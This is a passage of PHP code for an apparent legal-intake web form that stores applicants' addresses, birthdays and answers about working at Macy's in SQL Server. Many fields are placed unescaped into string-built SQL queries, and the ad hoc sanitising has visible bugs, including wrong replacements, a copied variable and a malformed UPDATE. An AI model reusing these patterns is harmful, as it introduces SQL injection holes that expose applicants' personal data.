		//
		//    $email = str_replace('-','',$email);
		//}
		
		////strip space
		//if(strstr($email,' '))
		//{
		//
		//    $email = str_replace(' ','',$email);
		//}
		//strip comma
		if(strstr($email,','))
		{
		
		    $email = str_replace(',','',$email);
		}
	
		//strip period
		//if(strstr($email,'.'))
		//{
		//
		//    $email = str_replace('.','',$email);
		//}
	
		//strip parenthasis open
		if(strstr($email,'('))
		{
		
			$email = preg_replace('/\(|\)/','',$email);
		}
		
		//strip parenthasis close
		if(strstr($email,')'))
		{
			$email = preg_replace('/\(|\)/','',$email); 
		}
	
		$var = "3Email";
		$vardata = $email;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	if (isset($_POST['StreetLine1']))   $Street1 = $_POST['StreetLine1'];
	if (empty($Street1))
	{
	unset($Street1);	
	}
	else
	{
		
		$usethis = $Street1;
		//strip single quote
		if(strstr($Street1,'\''))
		{
		
		    $Street1 = str_replace('\'','',$Street1);
		}
		
		//strip double quote
		if(strstr($Street1,'\"'))
		{
		
		    $Street1 = str_replace('\"','',$Street1);
		}	
		//strip percentage
		if(strstr($Street1,'%'))
		{
		
		    $Street1 = str_replace('%','',$Street1);
		}
		//strip asterisk
		if(strstr($Street1,'*'))
		{
		
		    $Street1 = str_replace('*','',$Street1);
		}
		//strip underscore
		if(strstr($Street1,'_'))
		{
		
		    $Street1 = str_replace('_','',$Street1);
		}
		//strip ampersand
		if(strstr($Street1,'&'))
		{
		
		    $Street1 = str_replace('\'','',$Street1);
		}	
		//strip dash
		if(strstr($Street1,'-'))
		{
		
		    $Street1 = str_replace('-','',$Street1);
		}
		
		//strip space
		//if(strstr($Street1,' '))
		//{
		//
		//    $Street1 = str_replace(' ','',$Street1);
		//}
		////strip comma
		//if(strstr($Street1,','))
		//{
		//
		//    $Street1 = str_replace(',','',$Street1);
		//}
	
		//strip period
		if(strstr($Street1,'.'))
		{
		
		    $Street1 = str_replace('.','',$Street1);
		}
	
		//strip parenthasis open
		if(strstr($Street1,'('))
		{
		
			$Street1 = preg_replace('/\(|\)/','',$Street1);
		}
		
		//strip parenthasis close
		if(strstr($Street1,')'))
		{
			$Street1 = preg_replace('/\(|\)/','',$Street1); 
		}
	
	    
		$streetline1 = $Street1;
		$var = "3StreetLine1";
		$vardata = $streetline1;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	if (isset($_POST['StreetLine2']))  $Street2 = $_POST['StreetLine2'];
	if (empty($Street2))
	{
	$Street2 = '';
	$streetline2 = $Street2;
	}
	else
	{
		
	
		//strip single quote
		if(strstr($Street2,'\''))
		{
		
		    $Street2 = str_replace('\'','',$Street2);
		}
		
		//strip double quote
		if(strstr($Street2,'\"'))
		{
		
		    $Street2 = str_replace('\"','',$Street2);
		}	
		//strip percentage
		if(strstr($Street2,'%'))
		{
		
		    $Street2 = str_replace('%','',$Street2);
		}
		//strip asterisk
		if(strstr($Street2,'*'))
		{
		
		    $Street2 = str_replace('*','',$Street2);
		}
		//strip underscore
		if(strstr($Street2,'_'))
		{
		
		    $Street2 = str_replace('_','',$Street2);
		}
		//strip ampersand
		if(strstr($Street2,'&'))
		{
		
		    $Street2 = str_replace('\'','',$Street2);
		}	
		//strip dash
		if(strstr($Street2,'-'))
		{
		
		    $Street2 = str_replace('-','',$Street2);
		}
		
		//strip space
		if(strstr($Street2,' '))
		{
		
		    $Street2 = str_replace(' ','',$Street2);
		}
		//strip comma
		if(strstr($Street2,','))
		{
		
		    $Street2 = str_replace(',','',$Street2);
		}
	
		//strip period
		if(strstr($Street2,'.'))
		{
		
		    $Street2 = str_replace('.','',$Street2);
		}
	
		//strip parenthasis open
		if(strstr($Street2,'('))
		{
		
			$Street2 = preg_replace('/\(|\)/','',$Street2);
		}
		
		//strip parenthasis close
		if(strstr($Street2,')'))
		{
			$Street2 = preg_replace('/\(|\)/','',$Street2); 
		}
	
		$streetline2 = $Street2;
		$var = "3StreetLine2";
		$vardata = $streetline2;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	if (isset($_POST['HomeCity'])) $City = $_POST['HomeCity'];
	if (empty($City))
	{
	unset($City);	
	}
	else
	{
		//strip single quote
		if(strstr($City,'\''))
		{
		
		    $City = str_replace('\'','',$City);
		}
		
		//strip double quote
		if(strstr($City,'\"'))
		{
		
		    $City = str_replace('\"','',$City);
		}	
		//strip percentage
		if(strstr($City,'%'))
		{
		
		    $City = str_replace('%','',$City);
		}
		//strip asterisk
		if(strstr($City,'*'))
		{
		
		    $City = str_replace('*','',$City);
		}
		//strip underscore
		if(strstr($City,'_'))
		{
		
		    $City = str_replace('_','',$City);
		}
		//strip ampersand
		if(strstr($City,'&'))
		{
		
		    $City = str_replace('\'','',$City);
		}	
		//strip dash
		if(strstr($City,'-'))
		{
		
		    $City = str_replace('-','',$City);
		}
		
		//strip space
		//if(strstr($City,' '))
		//{
		//
		//    $City = str_replace(' ','',$City);
		//}
		//strip comma
		if(strstr($City,','))
		{
		
		    $City = str_replace(',','',$City);
		}
	
		//strip period
		if(strstr($City,'.'))
		{
		
		    $City = str_replace('.','',$City);
		}
	
		//strip parenthasis open
		if(strstr($City,'('))
		{
		
			$City = preg_replace('/\(|\)/','',$City);
		}
		
		//strip parenthasis close
		if(strstr($City,')'))
		{
			$City = preg_replace('/\(|\)/','',$City); 
		}
	 
		$homecity = $City;
		$var = "3HomeCity";
		$vardata = $homecity;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	if (isset($_POST['HomeState']))  $State = $_POST['HomeState'];
	if (empty($State))
	{
	unset($State);	
	}
	else
	{
		//strip single quote
		if(strstr($State,'\''))
		{
		
		    $State = str_replace('\'','',$State);
		}
		
		//strip double quote
		if(strstr($State,'\"'))
		{
		
		    $State = str_replace('\"','',$State);
		}	
		//strip percentage
		if(strstr($State,'%'))
		{
		
		    $State = str_replace('%','',$State);
		}
		//strip asterisk
		if(strstr($State,'*'))
		{
		
		    $State = str_replace('*','',$State);
		}
		//strip underscore
		if(strstr($State,'_'))
		{
		
		    $State = str_replace('_','',$State);
		}
		//strip ampersand
		if(strstr($State,'&'))
		{
		
		    $State = str_replace('\'','',$State);
		}	
		//strip dash
		if(strstr($State,'-'))
		{
		
		    $State = str_replace('-','',$State);
		}
		
		//strip space
		if(strstr($State,' '))
		{
		
		    $State = str_replace(' ','',$State);
		}
		//strip comma
		if(strstr($State,','))
		{
		
		    $State = str_replace(',','',$State);
		}
	
		//strip period
		if(strstr($State,'.'))
		{
		
		    $State = str_replace('.','',$State);
		}
	
		//strip parenthasis open
		if(strstr($State,'('))
		{
		
			$State = preg_replace('/\(|\)/','',$State);
		}
		
		//strip parenthasis close
		if(strstr($State,')'))
		{
			$State = preg_replace('/\(|\)/','',$State); 
		}
	
		$homestate = $State;
		$var = "3HomeState";
		$vardata = $homestate;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	if (isset($_POST['Zipcode'])) $Zipcode = $_POST['Zipcode'];
	if (empty($Zipcode))
	{
		unset($Zipcode);
	}
	else
	{
		//strip single quote
		if(strstr($Zipcode,'\''))
		{
		
		    $Zipcode = str_replace('\'','',$Zipcode);
		}
		
		//strip double quote
		if(strstr($Zipcode,'\"'))
		{
		
		    $Zipcode = str_replace('\"','',$Zipcode);
		}	
		//strip percentage
		if(strstr($Zipcode,'%'))
		{
		
		    $Zipcode = str_replace('%','',$Zipcode);
		}
		//strip asterisk
		if(strstr($Zipcode,'*'))
		{
		
		    $Zipcode = str_replace('*','',$Zipcode);
		}
		//strip underscore
		if(strstr($Zipcode,'_'))
		{
		
		    $Zipcode = str_replace('_','',$Zipcode);
		}
		//strip ampersand
		if(strstr($Zipcode,'&'))
		{
		
		    $Zipcode = str_replace('\'','',$Zipcode);
		}	
		//strip dash
		if(strstr($Zipcode,'-'))
		{
		
		    $Zipcode = str_replace('-','',$Zipcode);
		}
		
		//strip space
		if(strstr($Zipcode,' '))
		{
		
		    $Zipcode = str_replace(' ','',$Zipcode);
		}
		//strip comma
		if(strstr($Zipcode,','))
		{
		
		    $Zipcode = str_replace(',','',$Zipcode);
		}
	
		//strip period
		if(strstr($Zipcode,'.'))
		{
		
		    $Zipcode = str_replace('.','',$Zipcode);
		}
	
		//strip parenthasis open
		if(strstr($Zipcode,'('))
		{
		
			$Zipcode = preg_replace('/\(|\)/','',$Zipcode);
		}
		
		//strip parenthasis close
		if(strstr($Zipcode,')'))
		{
			$Zipcode = preg_replace('/\(|\)/','',$Zipcode); 
		}
	 
		$zipcode = $Zipcode;
		$var = "3Zipcode";
		$vardata = $zipcode;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	if (isset($_POST['didyouworkatmacysretail'])) 
	{	$didyouworkatmacysretail = $_POST['didyouworkatmacysretail'];
		$var = "didyouworkatmacysretail";
		$vardata = $didyouworkatmacysretail;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['didyouworkatmacysretail']))
		{
		    $didyouworkatmacysretail = '';
		}
	}
	
	
	
	if (isset($_POST['formerlastdayyear'])) $formerlastdayyear = $_POST['formerlastdayyear'];
	if (isset($_POST['formerlastdayday'])) $formerlastdayday = $_POST['formerlastdayday'];
	if (isset($_POST['formerlastdaymonth'])) $formerlastdaymonth = $_POST['formerlastdaymonth'];
	if (isset($_POST['formerlastdayyear']))
	{	$formerlastday = "$formerlastdayyear".'-'."$formerlastdaymonth" .'-'. "$formerlastdayday";
		$var = "formerlastday";
		$vardata = $formerlastday;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['formerlastdayyear']))
		{
		    $formerlastdayyear = '';
		}
	}
	
	if (isset($_POST['shortcheck1'])) 
	{	$shortcheck1 = $_POST['shortcheck1'];
		$var = "shortcheck1";
		$vardata = $shortcheck1;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck1']))
		{
		    $shortcheck1 = '';
		}
	}
	
	if (isset($_POST['shortcheck2'])) 
	{	$shortcheck2 = $_POST['shortcheck2'];
		$var = "shortcheck2";
		$vardata = $shortcheck2;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck2']))
		{
		    $shortcheck2 = '';
		}
	}
	
	if (isset($_POST['shortcheck3'])) 
	{	$shortcheck3 = $_POST['shortcheck3'];
		$var = "shortcheck3";
		$vardata = $shortcheck3;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck3']))
		{
		    $shortcheck3 = '';
		}
	}
	
	if (isset($_POST['shortcheck4'])) 
	{	$shortcheck4 = $_POST['shortcheck4'];
		$var = "shortcheck4";
		$vardata = $shortcheck4;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck4']))
		{
		    $shortcheck4 = '';
		}
	}
	
	if (isset($_POST['shortcheck5'])) 
	{	$shortcheck5 = $_POST['shortcheck5'];
		$var = "shortcheck5";
		$vardata = $shortcheck5;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck5']))
		{
		    $shortcheck5 = '';
		}
	}
	
	if (isset($_POST['shortcheck6'])) 
	{	$shortcheck6 = $_POST['shortcheck6'];
		$var = "shortcheck6";
		$vardata = $shortcheck6;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck6']))
		{
		    $shortcheck6 = '';
		}
	}
	
	if (isset($_POST['shortcheck7'])) 
	{	$shortcheck7 = $_POST['shortcheck7'];
		$var = "shortcheck7";
		$vardata = $shortcheck7;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
		$results = sqlsrv_query($conn,$query);
	}
	else
	{
	    if (!isset($_POST['shortcheck7']))
		{
		    $shortcheck7 = '';
		}
	}
	
	if (isset($_POST['shortcheck8'])) 
	{	$shortcheck8 = $_POST['shortcheck8'];
		$var = "shortcheck8";
		$vardata = $shortcheck8;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck8']))
		{
		    $shortcheck8 = '';
		}
	}
	
	if (isset($_POST['shortcheck9'])) 
	{	$shortcheck9 = $_POST['shortcheck9'];
		$var = "shortcheck9";
		$vardata = $shortcheck9;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck9']))
		{
		    $shortcheck9 = '';
		}
	}
	
	if (isset($_POST['shortcheck10'])) 
	{	$shortcheck10 = $_POST['shortcheck10'];
		$var = "shortcheck10";
		$vardata = $shortcheck10;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	else
	{
	    if (!isset($_POST['shortcheck10']))
		{
		    $shortcheck10 = '';
		}
	}
	
	if (isset($_POST['shortanythingelse'])) $shortanythingelse = $_POST['shortanythingelse'];
	if (empty($shortanythingelse))
	{
		$shortanythingelse = '';
	}
	else
	{
		//strip single quote
		if(strstr($shortanythingelse,'\''))
		{
		
		    $shortanythingelse = str_replace('\'','',$shortanythingelse);
		}
		
		//strip double quote
		if(strstr($shortanythingelse,'\"'))
		{
		
		    $shortanythingelse = str_replace('\"','',$shortanythingelse);
		}	
		//strip percentage
		if(strstr($shortanythingelse,'%'))
		{
		
		    $shortanythingelse = str_replace('%','',$shortanythingelse);
		}
		//strip asterisk
		if(strstr($shortanythingelse,'*'))
		{
		
		    $shortanythingelse = str_replace('*','',$shortanythingelse);
		}
		////strip underscore
		//if(strstr($shortanythingelse,'_'))
		//{
		//
		//    $shortanythingelse = str_replace('_','',$shortanythingelse);
		//}
		//strip ampersand
		if(strstr($shortanythingelse,'&'))
		{
		
		    $shortanythingelse = str_replace('\'','',$shortanythingelse);
		}	
		//strip dash
		if(strstr($shortanythingelse,'-'))
		{
		
		    $shortanythingelse = str_replace('-','',$shortanythingelse);
		}
		
		////strip space
		//if(strstr($shortanythingelse,' '))
		//{
		//
		//    $shortanythingelse = str_replace(' ','',$shortanythingelse);
		//}
		//strip comma
		if(strstr($shortanythingelse,','))
		{
		
		    $shortanythingelse = str_replace(',','',$shortanythingelse);
		}
	
		//strip period
		if(strstr($shortanythingelse,'.'))
		{
		
		    $shortanythingelse = str_replace('.','',$shortanythingelse);
		}
	
		//strip parenthasis open
		if(strstr($shortanythingelse,'('))
		{
		
			$shortanythingelse = preg_replace('/\(|\)/','',$shortanythingelse);
		}
		
		//strip parenthasis close
		if(strstr($shortanythingelse,')'))
		{
			$shortanythingelse = preg_replace('/\(|\)/','',$shortanythingelse); 
		}
	 
		#$shortanythingelse = $_POST['shortanythingelse'];
		$var = "shortanythingelse";
		$vardata = $shortanythingelse;
		$query = "UPDATE status set $var='$vardata' WHERE uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				
	
	}
	

	
	 

		if (isset($uniqueid))
		{
			if (!isset($barcode))
			{
			    $query = "IF NOT EXISTS
			    (SELECT uniqueid FROM status WHERE uniqueid='$uniqueid') INSERT INTO status (uniqueid,notelog,email,phone1,phone2,currentstatus,currentstatusdate,brandid,tenantid,date,time,brand,completedonline,onlinecompleteday,onlinecompleteweek,onlinecompletemonth,onlinecompletetime,FirstName,LastName,Street1,Street2,City,State,Zipcode,interviewstarted,reachedretainerdiscussion,interviewstartmonthyear,interviewstartday,interviewcompletemonthyear,interviewcompleteday,interviewstarttime,interviewcompletetime,interviewstartweek,interviewcompleteweek,agentlname,agentfname,shortanythingelse,shortcheck1,shortcheck2,shortcheck3,shortcheck4,shortcheck5,shortcheck6,shortcheck7,shortcheck8,shortcheck9,shortcheck10)
			    
			    VALUES
			    
			    ('$uniqueid',
			    '$date @ $time: <strong>Shortform Complete via website</strong><br>',
			    '$email',
			    '$callbacknum','$secondarynumber','Shortform Complete',
			    '$date','$brandid','$tenantid',
			    '$date','$time','$brand','Yes',
			    '$date','$week',
			    '$month','$time',
			    '$whofirstname','$wholastname','$streetline1',
			    '$streetline2','$homecity','$homestate','$zipcode',
			    'Yes','Yes',
			    '$month','$date','$month',
			    '$date','$time','$time',
			    '$week','$week',
			    '$attorneylname','$attorneyfname',
			    '$shortanythingelse','$shortcheck1','$shortcheck2','$shortcheck3','$shortcheck4','$shortcheck5',
			    '$shortcheck6','$shortcheck7','$shortcheck8','$shortcheck9','$shortcheck10'
			    )";
			    
			    $results = sqlsrv_query($conn,$query);
			    
$query = "select notelog from status where uniqueid='$uniqueid'";
$results = sqlsrv_query($conn,$query);
while($row = sqlsrv_fetch_array($results))
    {
	$notelog = $row['notelog'];
    }
$notelognew = $date.' @ '.$time.' : <strong>Shortform Complete Online</strong><br>'.$notelog;
$query = "update Status set notelog='$notelognew' where uniqueid='$uniqueid'";
$results = sqlsrv_query($conn,$query);
			
	$query = "IF EXISTS (SELECT uniqueid from status WHERE status.uniqueid='$uniqueid' AND status.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE status set completedonline='Yes',onlinecompleteday='$date',onlinecompleteweek='$week',onlinecompletemonth='$month',onlinecompletetime='$time',FirstName='$whofirstname',LastName='$wholastname',Street1='$streetline1',Street2='$streetline2',City='$homecity',State='$homestate',Zipcode='$zipcode',interviewstarted='Yes',reachedretainerdiscussion='Yes',interviewstartmonthyear='$month',interviewstartday='$date',interviewcompletemonthyear='$date',interviewcompleteday='$date',interviewstarttime='$time',interviewcompletetime='$time',interviewstartweek='$week',interviewcompleteweek='$week',retainerSent='Docusign',retainerSentDate='$date',retainerSentMonth='$month',retainerSentWeek='$week',email='$email',agentlname='$attorneylname',agentfname='$attorneyfname' WHERE status.uniqueid='$uniqueid' AND status.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
	$results = sqlsrv_query($conn,$query);
	
	if (isset($_POST['didyouworkatmacysretail'])) 
{	$didyouworkatmacysretail = $_POST['didyouworkatmacysretail'];
	$var = "didyouworkatmacysretail";
	$vardata = $didyouworkatmacysretail;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['areyoucurrentmacysemployee'])) 
{	$areyoucurrentmacysemployee = $_POST['areyoucurrentmacysemployee'];
	$var = "areyoucurrentmacysemployee";
	$vardata = $areyoucurrentmacysemployee;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);
			

}

if (isset($_POST['Birthday']))
{
	$Birthday = $_POST['Birthday'];
	$var = "dateofbirth";
	$vardata = $Birthday;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);
			

}
	
	if ($shortnoneoftheabove !== 'No')
		    {
			$query = "select notelog from status where uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			while($row = sqlsrv_fetch_array($results))
			    {
				$notelog = $row['notelog'];
			    }
			$notelognew = $date.' @ '.$time.' : <strong>Worked at Macy\'s but has no claims.</strong><br>'.$notelog;
			$query = "update Status set notelog='$notelognew' where uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
		    }
		else
		    {
			if(isset($wantstoshare))
			{
			    if ($wantstoshare == 'Yes')
			    {
				$query = "select notelog from status where uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				while($row = sqlsrv_fetch_array($results))
				    {
					$notelog = $row['notelog'];
				    }
				$notelognew = $date.' @ '.$time.' : <strong>Did not work at Macy\'s but has potential claims and wants to discuss them.</strong><br>'.$notelog;
				$query = "update Status set notelog='$notelognew' where uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
			    }
			}
		    }
			}
			else
			{
			$query = "IF NOT EXISTS
			(SELECT uniqueid FROM status WHERE uniqueid='$uniqueid') INSERT INTO status (uniqueid,notelog,email,phone1,phone2,currentstatus,currentstatusdate,brandid,tenantid,date,time,brand,completedonline,onlinecompleteday,onlinecompleteweek,onlinecompletemonth,onlinecompletetime,FirstName,LastName,Street1,Street2,City,State,Zipcode,interviewstarted,reachedretainerdiscussion,interviewstartmonthyear,interviewstartday,interviewcompletemonthyear,interviewcompleteday,interviewstarttime,interviewcompletetime,interviewstartweek,interviewcompleteweek,agentlname,agentfname,barcode) VALUES ('$uniqueid','$date @ $time : <strong>Shortform Complete Online</strong><br>','$email','$callbacknum','$secondarynumber','Shortform Complete','$date','$brandid','$tenantid','$date','$time','$brand','Yes','$date','$week','$month','$time','$whofirstname','$wholastname','$streetline1','$streetline2','$homecity','$homestate','$zipcode','Yes','Yes','$month','$date','$month','$date','$time','$time','$week','$week','$attorneylname','$attorneyfname','$barcode')";
			$results = sqlsrv_query($conn,$query);
		    
			$query = "IF EXISTS (SELECT uniqueid from status WHERE status.uniqueid='$uniqueid' AND status.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE status set completedonline='Yes',onlinecompleteday='$date',onlinecompleteweek='$week',onlinecompletemonth='$month',onlinecompletetime='$time',FirstName='$whofirstname',LastName='$wholastname',Street1='$streetline1',Street2='$streetline2',City='$homecity',State='$homestate',Zipcode='$zipcode',interviewstarted='Yes',reachedretainerdiscussion='Yes',interviewstartmonthyear='$month',interviewstartday='$date',interviewcompletemonthyear='$date',interviewcompleteday='$date',interviewstarttime='$time',interviewcompletetime='$time',interviewstartweek='$week',interviewcompleteweek='$week',retainerSent='Docusign',retainerSentDate='$date',retainerSentMonth='$month',retainerSentWeek='$week',phone1='$callbacknum',phone2='$secondarynumber',email='$email',notelog='$date @ $time : <strong>Shortform Complete Online</strong><br>',agentlname='$attorneylname',agentfname='$attorneyfname' WHERE status.uniqueid='$uniqueid' AND status.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
			$results = sqlsrv_query($conn,$query);
			}
		if ($shortnoneoftheabove !== 'No')
		    {
			$query = "select notelog from status where uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			while($row = sqlsrv_fetch_array($results))
			    {
				$notelog = $row['notelog'];
			    }
			$notelognew = $date.' @ '.$time.' : <strong>Worked at Macys but has no claims.</strong><br>'.$notelog;
			$query = "update Status set notelog='$notelognew',retainerSent='',retainerSentDate='',retainerSentMonth='',retainerSentWeek='' where uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
		    }
		else
		    {
			if(isset($wantstoshare))
			{			
			    if ($wantstoshare == 'Yes')
			    {
				$query = "select notelog from status where uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
				while($row = sqlsrv_fetch_array($results))
				{
				    $notelog = $row['notelog'];
				}
				$notelognew = $date.' @ '.$time.' : <strong>Did not work at Macys but has potential claims and wants to discuss them.</strong><br>'.$notelog;
				$query = "update Status set notelog='$notelognew',,retainerSent='',retainerSentDate='',retainerSentMonth='',retainerSentWeek='' where uniqueid='$uniqueid'";
				$results = sqlsrv_query($conn,$query);
			    }
		    }
		    }
		    
		    if (isset($_POST['formerlastdaymonth']))
{	
	$var = "formerlastdaymonth";
	$vardata = $_POST['formerlastdaymonth'];
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
}

if (isset($_POST['formerlastdayyear']))
{	
	$var = "formerlastdayyear";
	$vardata = $_POST['formerlastdayyear'];
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
}
if (isset($_POST['barcode'])) 
{	$shortcheck1 = $_POST['barcode'];
	$var = "barcode";
	$vardata = $barcode;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}			
if (isset($_POST['shortcheck1'])) 
{	$shortcheck1 = $_POST['shortcheck1'];
	$var = "shortcheck1";
	$vardata = $shortcheck1;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck2'])) 
{	$shortcheck2 = $_POST['shortcheck2'];
	$var = "shortcheck2";
	$vardata = $shortcheck2;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck3'])) 
{	$shortcheck3 = $_POST['shortcheck3'];
	$var = "shortcheck3";
	$vardata = $shortcheck3;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}

	$var = "shortFormCompleteOnline";
	$vardata = "Yes";
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);


if (isset($_POST['shortcheck4'])) 
{	$shortcheck4 = $_POST['shortcheck4'];
	$var = "shortcheck4";
	$vardata = $shortcheck4;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck5'])) 
{	$shortcheck5 = $_POST['shortcheck5'];
	$var = "shortcheck5";
	$vardata = $shortcheck5;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck6'])) 
{	$shortcheck6 = $_POST['shortcheck6'];
	$var = "shortcheck6";
	$vardata = $shortcheck6;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck7'])) 
{	$shortcheck7 = $_POST['shortcheck7'];
	$var = "shortcheck7";
	$vardata = $shortcheck7;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck8'])) 
{	$shortcheck8 = $_POST['shortcheck8'];
	$var = "shortcheck8";
	$vardata = $shortcheck8;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck9'])) 
{	$shortcheck9 = $_POST['shortcheck9'];
	$var = "shortcheck9";
	$vardata = $shortcheck9;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['shortcheck10'])) 
{	$shortcheck10 = $_POST['shortcheck10'];
	$var = "shortcheck10";
	$vardata = $shortcheck10;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}

if (isset($_POST['shortanythingelse'])) $shortanythingelse = $_POST['shortanythingelse'];
if (empty($shortanythingelse))
{
	unset($shortanythingelse);
}
else
{
	//strip single quote
	if(strstr($shortanythingelse,'\''))
	{
	
	    $shortanythingelse = str_replace('\'','',$Zipcode);
	}
	
	//strip double quote
	if(strstr($shortanythingelse,'\"'))
	{
	
	    $shortanythingelse = str_replace('\"','',$shortanythingelse);
	}	
	//strip percentage
	if(strstr($shortanythingelse,'%'))
	{
	
	    $shortanythingelse = str_replace('%','',$shortanythingelse);
	}
	//strip asterisk
	if(strstr($shortanythingelse,'*'))
	{
	
	    $shortanythingelse = str_replace('*','',$shortanythingelse);
	}
	////strip underscore
	//if(strstr($shortanythingelse,'_'))
